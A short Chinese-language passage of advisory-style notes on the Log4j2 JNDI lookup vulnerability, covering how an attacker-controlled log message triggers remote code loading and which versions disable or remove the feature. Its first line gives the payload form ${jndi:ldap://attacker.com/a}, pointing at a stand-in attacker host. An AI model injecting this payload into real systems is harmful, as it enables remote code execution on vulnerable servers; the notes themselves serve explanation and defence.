    - 发送包含${jndi:ldap://attacker.com/a}格式的恶意日志消息

漏洞利用方法
    - 攻击者可以控制日志消息或日志消息参数
    - 利用Log4j2的JNDI查找功能，通过LDAP服务器加载并执行任意代码
    - 从Log4j 2.15.0开始，此行为默认被禁用；从版本2.16.0开始，此功能被完全移除
    - 该漏洞仅影响log4j-core，不影响log4net、log4cxx或其他Apache Logging Services项目
